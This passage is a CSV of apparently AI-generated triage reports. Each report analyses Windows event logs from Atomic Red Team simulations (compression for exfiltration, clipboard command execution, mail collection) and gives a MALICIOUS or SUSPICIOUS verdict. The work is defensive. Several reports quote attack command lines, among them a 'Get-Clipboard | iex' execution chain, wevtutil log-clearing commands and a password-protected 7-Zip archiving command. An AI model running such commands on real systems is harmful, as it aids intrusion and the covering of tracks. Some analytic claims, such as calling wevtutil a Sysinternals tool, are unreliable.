Directory Name,AI Response
Copy a sensitive File over Administrative share with Powershell,"Upon analyzing a series of Windows event logs, several key points of interest stand out that warrant further investigation. Here's a detailed breakdown of the findings:

### Indicators of Suspicious Activity:

1. **Clearing of Event Logs**:
   - **Security Event Log Clearing**: EventID 1102 indicates that the security log was cleared by the user `admin_test` on `Server002`. This is a significant red flag as clearing event logs is often an attempt to cover tracks after malicious activities.
   - **Sysmon Log Clearing**: Multiple events show execution of `wevtutil.exe` to clear different event logs, such as Sysmon/Operational and Windows PowerShell. This further raises concerns about intentional log tampering.

2. **Suspicious PowerShell Activity**:
   - **Execution of PowerShell**: There is use of `powershell.exe` with a command that involves copying a file (`Easter_Bunny.password`) to a temporary directory (`$Env:TEMP`). This could indicate suspicious scripting activity, perhaps related to unauthorized data transfer or exfiltration.

3. **Anomalous Command-Line Use**:
   - The specific PowerShell command involving a file named `Easter_Bunny.password` suggests an attempt at encrypted or disguised data handling. Using PowerShell for such tasks is a common trick used by attackers to perform malicious activities stealthily.

### Assessment:

Considering the above points, the logs show the clearing of several key event logs which is a strong indication of an attempt to obfuscate activities. The suspicious use of PowerShell to manipulate potentially sensitive files only heightens the likelihood of malicious intent.

### Conclusion:

- **Resolution**: **MALICIOUS**
- The evidence of deliberate log clearance coupled with potentially illicit use of PowerShell processes indicates strongly malicious activity. 

### Recommendations for Action:

1. **Immediate Containment**:
   - Isolate `Server002` from the network to prevent any further potential exfiltration or lateral movement by the threat actor.
   
2. **Incident Response**:
   - Conduct a full forensic analysis of the server to recover detailed logs prior to their clearance and identify the nature and scope of the compromise.
   
3. **Review of Access Controls**:
   - Audit user accounts, specifically those with elevated privileges like `admin_test`, to ensure no unauthorized accesses have occurred, and implement stricter access control policies.

4. **Enhanced Monitoring & Alerting**:
   - Enhance logging and monitoring to detect and respond to similar suspicious activities in real-time, and ensure log data is securely archived off-server to prevent similar incidents of deletion or alteration."
ESXi - Remove Syslog remote,"### Detailed Analysis:

Upon reviewing the logs provided across various channels, a few key points indicate potentially suspicious or malicious activity:

1. **Log Clearing Activities:**
   - **System Logs:**
     - Event ID 104 indicates that the ""System"" log was cleared by a user with the username ""admin_test"". Additionally, Event ID 104 shows ""Windows PowerShell"" log cleared under the same user account.
   
   - **Security Logs:**
     - Event ID 1102 also indicates that the ""Security"" logs were cleared by the same user ""admin_test"".

   **Analysis:** Clearing logs is a known tactic to hide malicious activities. The frequent clearing of logs, particularly security logs, by a non-anticipated user or process is a significant indicator of potential malicious intent or activity.

2. **Suspicious PowerShell Execution:**
   - **PowerShell Logs:**
     - There are multiple PowerShell Event ID 600 entries showcasing the use of ""plink.exe"", a command-line utility of PuTTY used for remote client SSH access.
     - The script attempts to extract and replace IP configurations related to syslog servers on an ""esxi"" host. These operations are executed from a temporary directory often associated with Atomic Red Team simulated adversary techniques.

   **Analysis:** The sophistication of the PowerShell commands and the context of the temporary paths indicate usage for potential lateral movement or data obscuring operations, especially given the presence of tools like `plink.exe`. 

3. **Sysmon Logs Reflecting Execution Activity:**
   - The logs show `wevtutil.exe` being executed to clear event logs (Event IDs 1 and 5 with Image path `C:\Windows\system32\wevtutil.exe` and command ""cl""), which aligns with the evidence seen in the clearing of ""System"", ""Security"", and ""PowerShell"" logs.
   - PowerShell command execution and the use of `plink.exe` in conjunction with Atomic Red Team directories are again noteworthy in the Sysmon logs.

4. **Privileged Operations and Logon Activity:**
   - Numerous events in the Security logs with Event ID 4672 expose the assignment of special privileges to the `SYSTEM` account, which could either be a standard operation or part of escalated operations.
   - Several processes reflecting administrative or SYSTEM privilege levels executed commands or were involved in activities that are typically unauthorized under normal usage conditions.

### Conclusion:

**Resolution: MALICIOUS**
- The combination of log clearings, unconventional PowerShell script executions accessing remote resources, and the usage pattern indicative of simulated attack scenarios strongly suggest malicious intent and activities.
- It is recommended to initiate a comprehensive investigation into the ""admin_test"" account, including password changes, checking for persistence mechanisms, and reviewing access logs for unusual connections to and from `Server002`.
- Immediate isolation of the affected systems and a forensic investigation to determine the full extent of the compromise should be conducted.
- Additionally, the deployment of compensating controls, such as more stringent logging, access monitoring, and potential user education or behavior management improvements, is advisable following this incident."
Compress Data for Exfiltration With PowerShell,"Based on the analysis of the provided Windows event logs, there are a series of activities that stand out and warrant attention. Here's a detailed breakdown:

1. **Security Logs:**
   - **Event ID 1102**: This event indicates that the security log was cleared, which is a significant indicator of potential malicious activity. The action was performed by the user `admin_test`. Clearing log files is often done by malicious actors to cover their tracks.
   - **Event ID 4624** and **4672**: These indicate a successful logon and assignment of special privileges to the SYSTEM account. While not inherently malicious, it is important to correlate these events with other activities.
   - **Repeated Event ID 5379**: These indicate credential validation operations failing for a certain user. Though the return code here (3221226021) suggests an error, repeated failures could indicate a brute force attempt or a misconfiguration.

2. **System Logs:**
   - Several logs were cleared by the user `admin_test`, paralleling the security logs' clearing. Having these multiple types of logs cleared might indicate an attempt to hinder forensic analysis or hide unauthorized activities.

3. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe` with the `cl` argument to clear event logs were recorded. This further confirms the log clearing suspicion.
   - **PowerShell Activity**: We see a PowerShell command being executed by `admin_test` that recursively archives files from the user's profile directory into a zip file named `T1560-data-ps.zip`. This action corresponds to Tactic ID T1560 of MITRE ATT&CK framework, which denotes data compression perhaps for exfiltration.

4. **PowerShell Logs:**
   - The command used matches known data archiving methods typically seen in data exfiltration attempts. The use of `Compress-Archive` to zip user profile directory contents is suspicious as it could signify staging files for exfiltration.

5. **Indications of Genuine Updates:**
   - Microsoft Defender and EdgeUpdate activity seen in both Sysmon and Application logs are legitimate update activities and less likely to be related to malicious actions.

**Assessment:**
The logs indicate a pattern of potentially malicious activities, particularly focusing on actions to obfuscate or delete audit trails, and possible data staging for exfiltration. The use of PowerShell to create a compressed archive of user-profile data is particularly suspicious.

**Resolution: MALICIOUS**

**Guidance on how to proceed:**
- Immediate isolation of the affected host (`Server002`) to prevent any potential data leakage or further unauthorized access.
- Conduct a thorough forensic analysis to determine the extent of the data access and potential exfiltration.
- Change passwords and review permissions for the `admin_test` account and any other account related to the incidents.
- Assess and harden the logging and monitoring configurations to avoid future occurrences.
- Consider engaging with an Incident Response team to assist with a deep-dive investigation and remediation plan."
Recon information for export with PowerShell,"### Detailed Analysis of Logs

Upon reviewing the provided logs, several events stood out as potential indicators of suspicious behavior. Let's break these down:

1. **Log Clearing Activities:**
   - **System Log Event 104:** 
     - The `Microsoft-Windows-Eventlog` shows multiple log clearance events by the user `admin_test` across different channels such as System and Windows PowerShell. These actions happened almost simultaneously, which is unusual unless performed intentionally for maintenance purposes or under suspicious contexts for concealing activities.
   - **Security Log Event 1102:**
     - Similar log clearance activity was recorded in the Security log, with the same user `admin_test` carrying out the actions.

2. **Time Manipulation Events:**
   - **Kernel-General and Security Auditing Event 4616:**
     - There are records of time changes using `svchost.exe`, which can sometimes be benign if conducted for legitimate system updates or time synchronization. However, unexpected or unauthorized time adjustments are a known tactic of attackers to evade detection by tampering timestamps.

3. **Command Execution and PowerShell Scripts:**
   - **Sysmon Log Activities:**
     - Multiple executions of `wevtutil.exe` command line utility for log exporting or clearing are noted. It was executed by `admin_test`, raising a flag considering the concurrent logs clearing.
   - **PowerShell Activity:**
     - PowerShell logs show activity related to data collection commands into temp files, which can suggest reconnaissance activity.

4. **System and Application Behavior:**
   - Multiple processes related to Microsoft Edge Update are noted, which appear benign and related to legitimate software updates. Yet, they coincide with the other suspicious activities in the timeline.

### Assessment

Based on the above observations, the presence of log clearance events by a regular user account, along with the coordinated system time manipulation and data collection scripts being executed through PowerShell, align with TTPs (Tactics, Techniques, and Procedures) of an internal compromise or preparation for further malicious activity.

### Resolution: SUSPICIOUS

Given the evidence of log clearing, time modification, and suspicious command-line executions particularly by `admin_test`, these activities do not confirm outright malicious intent but strongly align with suspicious behavior that necessitates further investigation. 

### Guidance on How to Proceed

- **Verify Intent:** Contact the user `admin_test` for a rationale behind the log clearance and time changes. Understanding the intent may clarify if these actions were authorized.
- **Deep Dive:** Conduct a deeper forensic review of the host, focusing on potentially hidden or deleted artifacts that might indicate malicious activity.
- **Monitor Environment:** Increase monitoring on key activities and critical assets, including any unusual script and network activities.
- **Implement Restrictions:** Apply restrictions on log clearing abilities and tighten PowerShell execution policies.
- **Review Access Controls:** Ensure that only authorized personnel have administrative access capable of affecting multiple log types.

A thorough investigation will help ascertain whether these actions are part of an internal error, misconfiguration, or indeed, a prelude to an external attack leveraging internal resources."
Compress Data and lock with password for Exfiltration with 7zip,"Upon reviewing the provided Windows event logs, several observations can be drawn:

### Suspicious Behavior
1. **Execution of Command Line Tools:**
   - Multiple instances of `cmd.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe` were executed by the user `SERVER002\admin_test`. 
   - `cmd.exe` execution occurred with the command: `/c if not exist \""%%ProgramFiles%%\7-zip\7z.exe\"" (exit /b 1)`. This checks for the existence of an executable, which could be part of a script or automated process.
   - `wevtutil.exe` was used to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl \""Windows PowerShell\""). Clearing logs is a common technique to cover tracks.

2. **Log Clearing:**
   - There are events indicating the clearing of logs (`EventID: 1102 from Security log` and `EventID: 104 from System log`) by `admin_test`. This is particularly concerning as it points towards potential malicious activity aimed at erasing tracks.

3. **Encryption Activity:**
   - The command involving `7z.exe` within the `cmd.exe` execution suggests potential encrypting of files: 
   ```
   mkdir C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1560.001\victim-files & echo \""This file will be encrypted\"" > .\encrypted_file.txt & \""%ProgramFiles%\7-zip\7z.exe\"" u archive.7z *txt -pblue
   ```
   - This is indicative of a step in a TTP (Tactic, Technique, and Procedure) related to data staging or encryption, often seen in ransomware activity.

### Other Observations
- **Privilege Escalation:**
  - The security log shows `EventID 4624` and `4672`, which indicate successful login and the assignment of special privileges, including `SeDebugPrivilege`, which can be a powerful right allowing access to sensitive areas of a system.

- **Automated/Scripted Behavior:**
  - The close timing and sequencing of events (e.g., commands executed, logs cleared in rapid succession) suggest potential automation or scripting, often used in intrusion scenarios or during penetration testing activities.

### Assessment
- The use of command-line tools for checking/installing potentially vulnerable software or staging data.
- The evidence of log clearing activity combined with the observed command-line operations strongly suggests attempting to obfuscate activities.
- Encryption activities further add weight to possible malicious intent.

Given these points, the resolution for the analysis of these logs is: **MALICIOUS**. These logs show signs of a compromise that includes track-covering techniques and potentially harmful actions that need immediate attention.

### Recommended Actions
- **Immediate Investigation and Response:**
  - Isolate the affected host (`Server002`) to prevent further spread or damage.
  - Conduct a more extensive digital forensic investigation to ascertain the breach's scope and impact.
  - Review and analyze any other logs (including network, DNS, etc.) and related systems for corroboration of suspicious activities.

- **Security Measures:**
  - Audit administrative access and ensure all security patches are current.
  - Implement enhanced logging and alerting mechanisms to capture detailed activity for analysis.
  - Conduct a root cause analysis post-remediation to understand how the initial compromise occurred and adjust defenses accordingly."
Utilize Clipboard to store or execute commands from,"Upon thorough analysis of the provided Windows event logs, several specific activities attract attention and warrant further scrutiny:

### Key Observations:

1. **Command Execution Patterns**:
   - Frequent execution of legitimate Windows utilities such as `hostname.exe`, `whoami.exe`, `cmd.exe`, `wevtutil.exe`, and `clip.exe` seem to indicate an attempt to gather system and user information, as well as manipulate event logs. 
     - These processes are commonly involved in system enumeration and are often seen in both benign and malicious activities. However, the presence of `wevtutil.exe` for clearing logs (`cl`) and the `clip.exe` utility used multiple times is indicative of attempt to obfuscate actions on the system - a suspicious activity in administrative contexts.
   - The execution of `cmd.exe` with command lines that manipulate clipboard contents and create temporary text files (`T1115` indicating a technique ID commonly associated with MITRE ATT&CK for data from clipboard) suggests potential data exfiltration or testing setup for such activities.

2. **Log Manipulation**:
   - Notable is the clearing of log files, such as the Security Event log (EventID 1102) and System logs (EventID 104), indicating potential cover-up of tracks or erasure of evidence. The logs being cleared by user `admin_test` correlates with the running processes, suggesting possibly intentional or compromised use of administrative privileges.

3. **Privileged Access and Actions**:
   - All activities are executed under a high-integrity context with `SERVER002\admin_test` suggesting elevated privilege execution which is either legitimate or could be part of privilege escalation.

4. **Time and Log Discrepancies**:
   - The manipulation of system time (`EventID 4616`) hints at potential attempts to disrupt accurate log timestamping for misguidance, although observed time adjustments are very minimal.

### Assessment:
Based on the above events, while all activities could potentially be part of legitimate administrative maintenance or diagnostics, the pattern and combination of actions such as clearing logs, executing command utilities directly with obfuscating techniques, and manipulation of system components is more aligned with potentially **malicious behavior**.

#### Resolution: **MALICIOUS**

### Recommendations:
1. **Immediate Action**:
   - Isolate the suspected host (`Server002`) and conduct a comprehensive review of activities within a broader network context.
   - Forensically preserve current system states (memory, disk images) for detailed examination.

2. **Further Investigation**:
   - Analyze any external connections made by this system, which could correlate to unauthorized data transfer.
   - Review possible unauthorized access or usage patterns associated with `admin_test`.
   - Perform a thorough review of system integrity and recovery actions against potential malware presence.

3. **Long-Term Measures**:
   - Engage in audit review and strengthen log management practices, ensuring that logs are secured against unauthorized clearing.
   - Update monitoring with alert mechanisms for suspicious sequences akin to those observed to better catch early signs of possible compromise.

4. **User Awareness and Training**:
   - Reiterate the importance of security hygiene, including regular training for administrators to recognize and report atypical command usage and execution patterns."
Execute Commands from Clipboard using PowerShell,"Based on the provided logs, the following analysis highlights several key points of interest:

### 1. **PowerShell Activity**:
- **Command Observations**: The PowerShell logs indicate the execution of a command that includes `Get-Process | clip` followed by `Get-Clipboard | iex`. This command is noteworthy because:
  - It collects a list of processes and places it onto the clipboard.
  - `iex`, short for `Invoke-Expression`, executes the clipboard contents as a command, which can be indicative of malicious activity, such as attempting to execute a payload from the clipboard.

### 2. **Sysmon Events**:
- **Clearing of Event Logs**: The Sysmon logs indicate `wevtutil.exe`, a utility used to clear or manage event logs, being executed several times and aligned with the clearing of critical logs:
  - **Log Cleared Event**: Events in both the Security (EventID: 1102) and System logs (EventID: 104) are cleared, specifically by the user `admin_test`. The timestamps coincide closely with `wevtutil.exe` executions. This action often suggests an attempt to erase traces of potentially unauthorized or malicious activities.

- **Use of `whoami.exe` and `hostname.exe`**: These executables are standard Windows utilities, often used by unauthorized users to gather information about the compromised system, such as the active username and hostname. These also occurred around the same time as the suspicious PowerShell activity.

### 3. **Security and Application Logs**:
- **Security Log EventID 1102**: Indicates that the security log has been cleared, which is typically a significant indicator of an attempt to conceal activities.
- **Application Log**: The logs are relatively benign, showing routine activities such as service stops but when combined with log clearance, these logs become suspicious as they might relate to attempts to hide actions from scrutiny.

### **Assessment**:
- **Indicators of Malicious Activity**: 
  - The use of PowerShell with the `iex` command coupled with the clipboard indicates potential execution of an obfuscated or hidden script.
  - Clearing of event logs (Security, System, Windows PowerShell) by `admin_test` using `wevtutil.exe` is a strong indicator of malicious intent often associated with an intruder attempting to cover tracks.

### **Resolution**:
Based on this analysis, the activities reflected in these logs are determined as:

- **MALICIOUS**: The execution pattern of commands, particularly the suspicious clipboard execution and subsequent clearing of event logs, strongly suggest an unauthorized infiltration and cover-up activity.

### **Recommendations**:
1. **Immediate Actions**: 
   - Isolate the affected system (Server002) from the network to prevent further potentially malicious activity.
   - Conduct a thorough forensic examination of the host to determine the full extent of the compromise.
   - Change credentials for accounts with administrative privileges, especially `admin_test`.

2. **Future Measures**:
   - Enhance monitoring and logging capabilities to detect and alert on similar suspicious activities in real-time.
   - Implement strict policies on PowerShell execution and clipboard access, along with user authentication and audit logging.

These steps will assist in mitigating potential threats and aid in post-incident investigations."
Office365 - Remote Mail Collected,"### Detailed Analysis of the Logs

#### 1. PowerShell Logs Analysis
The PowerShell logs show a series of execution instances where a highly suspicious and potentially malicious activity is happening:
- **Command Execution**: The command executed involves several PowerShell cmdlets such as `Connect-AzAccount`, `Get-AzAccessToken`, and manipulation of service principals, which are operations associated with Azure AD and Microsoft Graph API.
- **Behavior Characteristics**: This pattern is indicative of an attacker attempting to create a backdoor or extract emails from Office365. It involves obtaining an access token for MSGraph, creating a new application with specific resource access, and assigning roles like ""Mail.Read"", which indicates an intention to read emails.
- **Script Complexity**: The presence of operations such as creating self-signed certificates, service principal assignments, and access token generation indicates the use of persistent and stealthy access.
- **Atomic Test Reference**: The use of ""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection"" in the logs suggests that this command sequence could be part of an attack simulation or a demonstration of a known attack technique.

#### 2. Sysmon Logs Analysis
The Sysmon logs provide visibility into process creations and terminations:
- **Process Execution**: There are multiple instances of `wevtutil.exe`, `conhost.exe`, and `PowerShell.exe` executions under the same user, `SERVER002\admin_test`. These processes were run with high integrity levels.
- **Event Clearing**: Frequent and systematic execution of `wevtutil.exe` for clearing event logs (`cl ` commands for Application, System, and Security logs) indicates log tampering to cover malicious activity.
- **Process Hierarchy**: The process hierarchy and parent-child relationships point to a system where the `wsmprovhost.exe` (Windows Remote Management host process) is being used to initiate these PowerShell commands, potentially indicating unauthorized remote execution.

#### 3. Security and System Log Analysis
- **Log Clearing Evidence**: The Security log (Event ID 1102) and System log entries indicate that logs were cleared, which is a strong indicator of malicious attempts to delete evidence.
- **User Identification**: Most activities are associated with the user `admin_test`, suggesting that this account may have been compromised to facilitate these activities.
- **Suspicious Logoff Activity**: The presence of a logoff event shortly after critical activities (Event ID 4634) under the same account adds to the suspicion.

### Assessment
The collected logs exhibit behavior strongly indicative of malicious activity:
- The pattern of accessing and attempting to manipulate Azure AD and MSGraph resources points towards potential unauthorized attempts to collect sensitive information.
- Log clearing activities and log manipulation efforts to conceal actions further bolster the assessment of malicious intent.
- While scripting references to known attack simulation (Atomic Test) may suggest non-malicious testing, the context and accompanying log manipulation raise red flags.

### Resolution: MALICIOUS

### Guidance on How to Proceed
1. **Immediate Containment**: Isolate the affected host to prevent further data access or leakage.
2. **Credential Management**: Investigate the `admin_test` account for unauthorized access and change credentials.
3. **Log Restoration and Review**: Attempt to restore cleared logs from backups if available, to gather more evidence regarding the extent of activities.
4. **Detailed Forensic Analysis**: Conduct a deep-dive forensic analysis on the host and involved network transactions to identify any additional compromised resources.
5. **Notify and Remediate**: Inform the appropriate internal security teams and potentially affected external parties (e.g., if emails were accessed) and follow up with remediation efforts to close any identified vulnerabilities.
6. **Monitor for Further Activity**: Enhance monitoring for similar patterns on the network to detect any recurring attempts."
Compress Data and lock with password for Exfiltration with winzip,"**Analysis of Suspicious or Anomalous Behavior:**

1. **Event Logs Clearing:**
   - **System Log (EventID: 104, Event: Logs Cleared)**
     - Two entries where logs are cleared by the user ""admin_test"" on ""Server002"".
     - Channels affected: ""System"" and ""Windows PowerShell"".
     - Clearing logs is a red flag as it is often indicative of malicious activity, as attackers may clear logs to cover their tracks.

2. **Security Log (EventID: 1102, Event: Security Log Cleared)**:
   - The security log was also cleared by ""admin_test"".
   - This reinforces the concern as clearing the Security log is critical and usually requires high privileges, which are abused to hide activities.

3. **Process Execution:**
   - **Sysmon Log (Cmd.exe and `wevtutil` tool usage)**
     - Usage of ""cmd.exe"" with command line arguments suggesting conditional logic (`if not exist ...`) often seen in scripting post-compromise for environment checking and further malicious payload execution.
     - Execution of ""wevtutil.exe"" to clear event logs.
     - These actions were performed by ""admin_test,"" indicating potentially unauthorized usage of administrative capabilities.

4. **Data Compression and Potential Data Exfiltration:**
   - An entry where ""cmd.exe"" is used to create a directory, add files into it, and encrypt them with WinZip using a password (""hello"").
   - This indicates a possible attempt to compress and encrypt data, potentially for exfiltration.
   - This usage of WinZip with a password is commonly associated with obfuscating the contents to evade defense mechanisms.

5. **Unusual Privilege Usage:**
   - Several processes such as ""sppsvc"" and ""TiWorker"" are running under system accounts, but actions involving log clearance and script execution via PowerShell are traced back to ""admin_test.""

6. **ID of Interest:**
   - Consistent usage of user ""SERVER002\\admin_test"" at a high integrity level for suspicious actions, a significant indicator of compromised account or credentials abuse.

**Conclusion:**

The examination of logs indicates several suspicious actions that either indicate malicious intent or unauthorized use of administrative privileges. Clearing event logs, conditional script execution via shell commands, and file encryption through compression utilities, all merit substantial concern.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

- **Immediate Actions:**
  - Isolate ""Server002"" from the network to prevent further potential data exfiltration or spread within the network.
  - Conduct a deep forensic analysis on ""Server002,"" focusing on data sets present around the timestamps noted in logs.

- **Credential Management:**
  - Change all credentials associated with ""admin_test"" and investigate for unauthorized access across other systems.

- **Monitoring and Defense:**
  - Enhance monitoring for similar patterns across other systems and establish tighter alerting for log clear events and suspicious use of utilities such as `cmd.exe` with scripting arguments.
  - Ensure logging functionalities are hardened and logs are regularly backed up in a secure manner for post-incident analysis.

- **Review Policies:**
  - Review and update security policies regarding access permissions and the usage of administrative commands by users to minimize misuse."
Search files of interest and save them to a single zip file (Windows),"Here is a detailed analysis of the provided Windows event logs:

1. **Security Log:**
   - Event ID 1102 indicates that the security log was cleared by ""admin_test"". This can be a sign of suspicious activity as malicious users often clear logs to cover their tracks.
   - Event ID 4624 shows a SYSTEM logon using Advapi, which could be benign if it's part of a scheduled task or service, but in conjunction with other findings, it requires further attention.
   - Event ID 4672 shows privileged access rights being assigned to SYSTEM, which is expected as SYSTEM inherently requires certain privileges.
   - Event ID 4616 shows potential time manipulation, potentially indicating an attempt to confuse timeline analysis.
   - Event ID 5379 entries reflect contact attempts with Microsoft accounts. ReturnCode 3221226021 translates to ""STATUS_NO_SUCH_USER"", suggesting failed attempts to access non-existent accounts, which could be part of reconnaissance or access attempts.

2. **Application Log:**
   - The RestartManager events (Event ID 10000 and 10001) show initiation, but there's no immediate sign of malicious activity without further context.

3. **Windows PowerShell Log:**
   - The PowerShell logs demonstrate a script was run to collect and compress files from user directories using extensions like `.doc`, `.docx`, `.txt`. The naming convention and path (likely related to 'Atomic Red Team T1005' which corresponds to data from local storage reconnaissance) suggest simulated attack or testing activity. However, without authorization, such activities could be indicative of data exfiltration attempts.

4. **Sysmon Log:**
   - Multiple wevtutil.exe executions with ""cl"" (log clear) command were recorded for various logs. This aligns with Event ID 1102 from the security log, indicating that someone tried to clear multiple logs with high privilege access (""SERVER002\\admin_test"").
   - PowerShell execution alongside Sysmon logs executing a compress script is noteworthy, potentially indicating data exfiltration.
   - Presence of legitimate system and service executions such as Windows Update (wuauclt.exe), TrustedInstaller, shows regular updates and tasks. However, these also need scrutiny given the context of other findings.

5. **System Log:**
   - Log clear events (Event ID 104) in the System log and PowerShell log by ""admin_test"", further confirms attempts to remove traces.

**Assessment:**
- The combination of log clearance, PowerShell data compression, repeated access attempts with non-existent Microsoft accounts, and SYSTEM logon suggests potential compromise. The atomic red team references indicate potential simulated attack scenarios or tests, which could be part of a red team exercise, but should not be assumed without confirmation.

**Resolution: MALICIOUS**
- Given that logs were cleared multiple times in conjunction with potentially unauthorized data exfiltration scripts executed through PowerShell and SYSTEM-level access attempts, this indicates a high likelihood of malicious activity. Immediate investigation is recommended to confirm if it was an authorized red team assessment or an actual breach.
  
**Guidance:**
- Verify if there was any authorized security testing such as a penetration test or red team engagement scheduled on the date of these logs.
- Investigate the user ""admin_test"" for any unauthorized access or credential theft.
- Review security policies around the clearance of logs and revamping access management if admin credentials were used improperly.
- Enhance monitoring and protection mechanisms for PowerShell usage and data exfiltration activities.
- Consider isolating the affected system and conducting a thorough forensic analysis."
Registry artefact when application use microphone,"Based on the analysis of the provided logs, here are the key observations:

1. **Sysmon Events:**
   - The logs show a series of process creations related to typical Windows utilities (`hostname.exe`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`, etc.). There is also execution of the `cmd.exe` to manipulate the registry (`reg.exe`), which is notably writing to keys related to microphone access permissions.
   - The notable command is executed by `cmd.exe`, which attempts to set registry keys related to microphone usage with unusual path formatting (`C:#Windows#Temp#atomic.exe`). This behavior is suspicious as it interacts with the `CapabilityAccessManager` in an obfuscated manner, potentially indicating an attempt to bypass standard application permissions.
   - `wevtutil.exe` is observed clearing logs for multiple channels (e.g., Sysmon, Security, Application). This is often an indicator of an attempt to cover tracks after executing potentially malicious activity.

2. **Security Events:**
   - The security logs indicate that event logs have been cleared (Event ID 1102). The clearing of logs is a classic indicator of malicious intent, as attackers often clear logs to erase any evidence of their actions.
   - There are time-change events (Event ID 4616), where time has been adjusted backward slightly. Although not inherently malicious, this can be used to manipulate logs and timestamps.

3. **Application and System Events:**
   - Application and System logs display events consistent with log clearing (Event ID 104), executed by the user `admin_test`.

**Assessment:**
- **Command Execution and Log Clearing:** The combination of registry key manipulation relating to privacy features (microphone), unusual command-line arguments, and attempts to clear multiple event logs and potentially alter system times strongly suggest suspicious activity.
- **Privilege Level:** The user `admin_test` has a high integrity level, indicating that these actions might be executed with administrative privileges, increasing the risk level.

**Resolution: SUSPICIOUS**
- The presence of these activities, specifically related to registry changes to microphone access and log clearing, suggest that further investigation is warranted. While there is strong suspicion of malicious activity, the definitive nature cannot be confirmed without deeper inspection into the intent and potential impacts.

**Guidance on how to proceed:**
1. **Immediate Actions:**
   - Isolate the affected system to prevent further potential abuse.
   - Collect further forensic evidence, such as memory dumps and running process details, to have a clearer picture.
  
2. **Investigation:**
   - Examine registry changes in-depth and identify if they align with known tools or malware.
   - Analyze network traffic for any suspicious communication patterns that may have been established.
   - Review access logs to identify any unauthorized access attempts or anomalies in user behavior patterns leading up to the events.

3. **Mitigation:**
   - Change any affected credentials, particularly those with administrative privileges.
   - Reinforce logging and monitoring to capture any repeated attempts of similar activities.

By following this guidance, the organization can obtain a more comprehensive understanding of the situation and take steps towards remediation and prevention of similar incidents in the future."
Recon information for export with Command Prompt,"Upon analysis of the provided Windows event logs, several indicators of potentially suspicious activity can be identified. Here is a detailed breakdown:

1. **Log Clearing:**
   - The **Security Log (Event ID: 1102)** and **System Log (Event ID: 104)** indicate that logs were cleared by the user `admin_test`. Clearing event logs is generally considered suspicious behavior because it can be an attempt to cover tracks after conducting illicit activities.

2. **Use of Sysinternal Utilities:**
   - The logs for processes `wevtutil.exe` and `conhost.exe` initiated by the user `admin_test` suggest malicious intent. The command-line usage for `wevtutil.exe` (`wevtutil cl Sysmon` and others) is used to clear logs, which can relate to the previously observed log-clearing events. This strengthens the suspicion of attempts to cover tracks.

3. **Unusual Command-Line Activity:**
   - The Sysmon event logs showcase the execution of `cmd.exe` running multiple chained commands, including `sc`, `doskey`, and `wmic`. This sequence, along with the utilization of `tree` pointing to a location `C:\AtomicRedTeam\atomics`, suggests the execution of several system enumeration and persistence-related tasks. These are activities often associated with post-exploitation frameworks like the Atomic Red Team exercises, which simulate adversary techniques.

4. **Time Sync Events:**
   - There are `Kernel-General` and `Time-Service` events that indicate the system time was changed. While sometimes benign, time changes can be manipulated to alter forensic evidence timelines.

5. **Edge Update Executions:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` and related processes under NT AUTHORITY\SYSTEM could suggest legitimate software updates (like Edge browser updates), given the absence of any direct indicators linking these executions to malicious activities. 

Based on these observations, the activity is **SUSPICIOUS** for the following reasons:
- Multiple indicators suggest attempts to hide malicious activity (log clearing, sysmon clearing using `wevtutil`).
- Execution of commands known for their use in reconnaissance and lateral movement phases of attacks.
- The presence of command executions related to known security exercises (Atomic Red Team).

### Recommendations:
1. **Conduct a Full System Analysis**: Verify the integrity of the system by checking installed software, running processes, and network connections for anomalies.
2. **Examine User Activity**: Investigate `admin_test` actions around the log clearing and suspect command execution times. Confirm if the user or account was intended to perform such operations.
3. **Increase Security Monitoring**: Implement additional auditing and activity monitoring measures across logs to detect similar patterns.
4. **Isolate the System**: If the server is part of a larger network, it might be prudent to isolate it to prevent potential lateral movement across the network while a thorough investigation takes place.

In conclusion, while direct malicious activity was not confirmed, the presence of significant suspicious behavior requires further investigation to rule out potential security breaches or unauthorized activities."
Compress Data for Exfiltration With Rar,"During the analysis of the provided Windows event logs, several suspicious activities suggest potential malicious actions:

1. **Log File Clearance:**
   - Several events indicate the clearing of event logs (EventID: 1102 for Security, EventID: 104 for System and Windows PowerShell). The actions were carried out by `admin_test`, which is highly suspicious, especially when logs are erased without legitimate reasons. This can be an indicator of an attempt to cover tracks of unauthorized activities.

2. **Command Execution:**
   - A `cmd.exe` process was executed with a command line performing operations with WinRAR to archive files (Sysmon record EventID: 18006). While WinRAR usage can be benign, the presence of `Rar.exe` coupled with log clearance generally strengthens the suspicion, especially when run from a temporary directory.

3. **Process Events Suggesting Potential Reconnaissance:**
   - Execution of `whoami.exe` (EventID: 18001) followed by `hostname.exe`. Executing these while clearing logs suggests potential reconnaissance and footprint masking activities.

4. **High Integrity Level Processes:**
   - Multiple processes (including instances of `wevtutil.exe`) executed under a high integrity level by `admin_test`. These were associated with clearing logs, further supporting the malicious nature of the log clearance events.

5. **Unusual System Time Changes:**
   - Slight modifications to system time were noted, though this can sometimes be explainable by normal updates and adjustments. In the context of other suspicious activities, however, it adds to the overall concern.

Based on this evidence, it is strongly indicated that these logs represent malicious activity, with particular focus on attempts to cover the tracks of potentially unauthorized data access or exfiltration.

**Assessment: MALICIOUS**

**Guidance:**
- Immediate actions should involve isolating the affected host `Server002` to prevent any potential spread or further data loss.
- Conducting a thorough forensic analysis to assess the scale of the activity and to identify any other potentially compromised systems or data is essential.
- Review and strengthen system access controls, especially for privileged accounts like `admin_test`.
- Ensure that proper logging and monitoring mechanisms are in place and functioning, and investigate how event log clearance was achieved without detection.
- Consider reaching out to incident response experts if internal resources are insufficient to manage the situation."
Windows Screencapture,"The Windows event logs provided contain several indications of potential suspicious activities on the host, Server002. Here's a breakdown of the events and their significance:

### 1. **Log File Clearing**

- **Events**: 
  - System Event ID 104 (Log file cleared) by user ""admin_test"" for multiple log channels, including System and Windows PowerShell.
  - Security Event ID 1102 (Audit log was cleared).

**Analysis**: Cleared log files, especially without a valid concurrent system maintenance procedure or known user activity, can indicate an attempt to cover malicious actions. The clearing by the user ""admin_test"" suggests that a user with administrative privileges may be involved in suspicious activity.

### 2. **Suspicious PowerShell Commands**

- **Events**:
